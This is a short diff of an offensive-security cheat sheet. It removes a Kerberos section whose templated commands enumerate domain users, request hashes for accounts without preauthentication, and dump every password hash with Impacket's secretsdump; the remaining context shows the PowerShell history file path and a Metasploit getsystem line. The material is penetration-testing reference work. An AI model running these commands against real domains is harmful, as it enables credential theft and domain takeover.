@@ -30,14 +30,6 @@ Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 ```
 
-### Kerberos
-```
-kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
-GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
-secretsdump.py -dc-ip [IP_ADDR] [DOMAIN].local/[USERNAME]:[PASSWORD]@[IP_ADDR]    # retrieve all of the password hashes
-```
-Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
-
 ### Metasploit
 ```
 getsystem
